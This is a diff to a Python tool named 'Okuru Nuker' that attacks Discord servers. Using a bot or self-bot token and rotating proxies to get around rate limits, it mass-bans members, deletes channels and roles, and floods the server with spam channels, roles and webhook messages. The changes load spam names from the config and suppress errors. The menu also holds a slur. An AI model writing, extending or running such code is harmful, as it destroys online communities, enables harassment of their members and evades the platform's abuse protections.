@@ -18,6 +18,9 @@ prefix = config["General"]["Prefix"]
 token = config["General"]["Token"]
 guild = config["General"]["Guild To Nuke"]
 
+nuke_channel_names = config["Nuke"]["Channel Names"]
+nuke_role_names = config["Nuke"]["Role Names"]
+
 wh_spam = config["Webhook Spam"]["Spam"]
 wh_spam_names = config["Webhook Spam"]["Webhook Names"]
 wh_spam_contents = config["Webhook Spam"]["Message Contents"]
@@ -71,11 +74,11 @@ if token_type == "user":
         case_insensitive=False,
         self_bot=True
     )
-    
+
 elif token_type == "bot":
     headers = {'Authorization': f'Bot {token}'}
     client = commands.Bot(
-        command_prefix=prefix, 
+        command_prefix=prefix,
         case_insensitive=False
     )
 
@@ -117,7 +120,7 @@ def roledel(k):
         proxies={"http": 'http://' + next(proxs)},
         headers=headers
     )
-        
+
     if r.status_code == 429:
         sys.stdout.write(f"\u001b[38;5;196m[RoleDeletion]\u001b[38;5;253m => Proxy ratelimited for: {r.json()['retry_after']}\n")
         roledel(k)
@@ -125,34 +128,40 @@ def roledel(k):
         sys.stdout.write(f'{Fore.LIGHTGREEN_EX}[RoleDeletion]\u001b[38;5;253m => Deleted {k}\n')
 
 def makewebhook(channel):
-    json = {
-        'name': random.choice(wh_spam_names),
-    }
-    r = requests.post(
-        f'https://discord.com/api/v8/channels/{channel}/webhooks',
-        headers=headers,
-        json=json,
-        proxies={"http": 'http://' + next(proxs)}
-    )
-    return f"https://discord.com/api/webhooks/{r.json()['id']}/{r.json()['token']}"
+    try:
+        json = {
+            'name': random.choice(wh_spam_names),
+        }
+        r = requests.post(
+            f'https://discord.com/api/v8/channels/{channel}/webhooks',
+            headers=headers,
+            json=json,
+            proxies={"http": 'http://' + next(proxs)}
+        )
+        return f"https://discord.com/api/webhooks/{r.json()['id']}/{r.json()['token']}"
+    except:
+        pass
 
 
 def sendwebhook(webhook):
-    for i in range(wh_spam_amount):
-        json={
-            'username': random.choice(wh_spam_names),
-            'content': random.choice(wh_spam_contents)
-        }
-        requests.post(
-            webhook, 
-            json=json, 
-            proxies={"http": 'http://' + next(proxs)}
-        )
+    try:
+        for i in range(wh_spam_amount):
+            json={
+                'username': random.choice(wh_spam_names),
+                'content': random.choice(wh_spam_contents)
+            }
+            requests.post(
+                webhook,
+                json=json,
+                proxies={"http": 'http://' + next(proxs)}
+            )
+    except:
+        pass
 
 
 def spamchannel(name):
     json = {
-        'name': name, 
+        'name': name,
         'type': 0
     }
     r = requests.post(
@@ -178,7 +187,7 @@ def spamrole(role):
         proxies={"http": 'http://' + next(proxs)},
         headers=headers, json=json
     )
-    
+
     if r.status_code == 429:
         sys.stdout.write(f"\u001b[38;5;196m[RoleSpam]\u001b[38;5;253m => Proxy ratelimited for: {r.json()['retry_after']}\n")
         spamrole(role)
@@ -189,10 +198,10 @@ def spamrole(role):
 def nukecmd():
     cls()
     print(f"\u001b[38;5;21m[?]\u001b[38;5;15m Ready To Nuke Server;\n")
-    name = input("\u001b[38;5;21m[?]\u001b[38;5;15m Channel Names: ")
+    print("\u001b[38;5;21m[?]\u001b[38;5;15m Channel Names Loaded From Config")
     amount = input("\u001b[38;5;21m[?]\u001b[38;5;15m Amount Of Channels: ")
     print()
-    role = input(f"\u001b[38;5;21m[?]\u001b[38;5;15m Role Names: ")
+    print(f"\u001b[38;5;21m[?]\u001b[38;5;15m Role Names Loaded From Config ")
     amount = input(f"\u001b[38;5;21m[?]\u001b[38;5;15m Amount Of Roles: ")
     cls()
     print(f"\u001b[38;5;21m[?]\u001b[38;5;15m Nuking Server...")
@@ -206,14 +215,13 @@ def nukecmd():
         threading.Thread(target=roledel, args=(r,)).start()
 
     for i in range(int(amount)):
-        threading.Thread(target=spamchannel, args=(name, )).start()
+        threading.Thread(target=spamchannel, args=(random.choice(nuke_channel_names), )).start()
 
     for i in range(int(amount)):
-        threading.Thread(target=spamrole, args=(role, )).start()
+        threading.Thread(target=spamrole, args=(random.choice(nuke_role_names), )).start()
 
-    sys.stdout.write('Finished, Going back in 3 seconds\n') 
+    sys.stdout.write('Finished, Going back in 3 seconds\n')
     time.sleep(3)
-    cls()
     menu()
 
 os.system('title [Okuru Nuker] - Menu')
@@ -223,8 +231,8 @@ def menu():
     print(f'''
 				\u001b[38;5;111m╔═╗╦╔═╦ ╦╦═╗╦ ╦  ╔╗╔╦ ╦╦╔═╔═╗╦═╗
 				\u001b[38;5;159m║ ║╠╩╗║ ║╠╦╝║ ║  ║║║║ ║╠╩╗║╣ ╠╦╝
-				\u001b[38;5;195m╚═╝╩ ╩╚═╝╩╚═╚═╝  ╝╚╝╚═╝╩ ╩╚═╝╩╚═\u001b[38;5;26m 
-                              
+				\u001b[38;5;195m╚═╝╩ ╩╚═╝╩╚═╚═╝  ╝╚╝╚═╝╩ ╩╚═╝╩╚═\u001b[38;5;26m
+
 			[+]═════════════════════[+]═══════════════════[+]
 			 ║ \u001b[38;5;27m[1] - Ban Members     ║ \u001b[38;5;27m[5] - Spam Roles    ║
 			 ║ \u001b[38;5;26m[2] - Del Channels    ║ \u001b[38;5;26m[6] - Nuke Server   ║
@@ -247,10 +255,10 @@ def menu():
         print("[OKURU:INFO] Starting to Ban Members")
         for m in members:
             threading.Thread(target=ban, args=(m, )).start()
-        sys.stdout.write('Finished, Going back in 3 seconds\n') 
+        sys.stdout.write('Finished, Going back in 3 seconds\n')
         time.sleep(3)
-        cls()
         menu()
+
 
     elif choice == 2:
         cls()
@@ -258,10 +266,10 @@ def menu():
         print("[OKURU:INFO] Starting to Delete Channels")
         for c in channels:
             threading.Thread(target=chandel, args=(c, )).start()
-        sys.stdout.write('Finished, Going back in 3 seconds\n') 
+        sys.stdout.write('Finished, Going back in 3 seconds\n')
         time.sleep(3)
-        cls()
         menu()
+
 
     elif choice == 3:
         cls()
@@ -269,24 +277,23 @@ def menu():
         print("[OKURU:INFO] Starting to Delete Roles")
         for r in roles:
             threading.Thread(target=roledel, args=(r, )).start()
-        sys.stdout.write('Finished, Going back in 3 seconds\n') 
+        sys.stdout.write('Finished, Going back in 3 seconds\n')
         time.sleep(3)
-        cls()
         menu()
+
 
     elif choice == 4:
         cls()
-        os.system(f'title [Okuru Nuker] - Create Channels')
-        print("[OKURU:INFO] Starting to Create Channels")
-        print()
-        name = input(f"\u001b[38;5;21m[?]\u001b[38;5;15m Channel Names: ")
+        os.system('title [Okuru Nuker] - Create Channels')
+        print("[OKURU:INFO] Starting to Create Channels\n")
+        print(f"\u001b[38;5;21m[?]\u001b[38;5;15m Channel Names Loaded From Config ")
         amount = input(f"\u001b[38;5;21m[?]\u001b[38;5;15m Amount: ")
         for i in range(int(amount)):
-            threading.Thread(target=spamchannel, args=(name, )).start()
-        sys.stdout.write('Finished, Going back in 3 seconds\n') 
+            threading.Thread(target=spamchannel, args=(random.choice(nuke_channel_names), )).start()
+        sys.stdout.write('Finished, Going back in 3 seconds\n')
         time.sleep(3)
-        cls()
         menu()
+
 
     elif choice == 5:
         cls()
@@ -297,25 +304,29 @@ def menu():
         amount = input("\u001b[38;5;21m[?]\u001b[38;5;15m Amount: ")
         for i in range(int(amount)):
             threading.Thread(target=spamrole, args=(role, )).start()
-        sys.stdout.write('Finished, Going back in 3 seconds\n') 
+        sys.stdout.write('Finished, Going back in 3 seconds\n')
         time.sleep(3)
-        cls()
         menu()
+
+
     elif choice == 6:
       cls()
       os.system('title [Okuru Nuker] - Nuking')
       nukecmd()
-      
+
     elif choice == 7:
         cls()
         print("\u001b[38;5;21m[?]\u001b[38;5;15m This Nuker was made by ; Gowixx, Yum, Aced.")
-        print("\u001b[38;5;21m[?]\u001b[38;5;15m Press Enter To Go Back.")
-        input()
+        input("\u001b[38;5;21m[?]\u001b[38;5;15m Press Enter To Go Back.\n")
         menu()
 
     elif choice == 8:
         print(f'\u001b[38;5;21m[?]\u001b[38;5;15m\u001b[38;5;7m Type \u001b[38;5;12m{prefix}scrape \u001b[38;5;7min any channel of the server.')
 
+    else:
+        print('Invalid choice retard')
+        time.sleep(3)
+        menu()
 
 @client.command()
 async def scrape(ctx):
@@ -332,24 +343,28 @@ async def scrape(ctx):
         pass
 
     with open('Scraped/members.okuru', 'a') as f:
+        ctx.guild.members
         for member in ctx.guild.members:
             f.write(str(member.id) + "\n")
             membercount += 1
         print(f"\u001b[38;5;21m[?]\u001b[38;5;15m Scraped \u001b[38;5;15m{membercount}\033[37m Members")
 
     with open('Scraped/channels.okuru', 'a') as f:
+        ctx.guild.channels
         for channel in ctx.guild.channels:
             f.write(str(channel.id) + "\n")
             channelcount += 1
         print(f"\u001b[38;5;21m[?]\u001b[38;5;15m Scraped \u001b[38;5;15m{channelcount}\033[37m Channels")
 
     with open('Scraped/roles.okuru', 'a') as f:
+        ctx.guild.roles
         for role in ctx.guild.roles:
             f.write(str(role.id) + "\n")
             rolecount += 1
         print(f"\u001b[38;5;21m[?]\u001b[38;5;15m Scraped \u001b[38;5;15m{rolecount}\033[37m Roles")
+        print(f"\u001b[38;5;21m[?]\u001b[38;5;15m Restart the program to reload apply changes")
 
-    sys.stdout.write('Finished, Going back in 3 seconds\n') 
+    sys.stdout.write('Finished, Going back in 3 seconds\n')
     time.sleep(3)
     menu()
 
@@ -361,15 +376,14 @@ async def on_ready():
 
 
 @client.event
-async def on_error(ctx, error):
-    return
-    
-@client.event
 async def on_connect():
     if token_type == "user":
         menu()
 
 
+@client.event
+async def on_command_error(ctx, error):
+    return
 
 
 try:
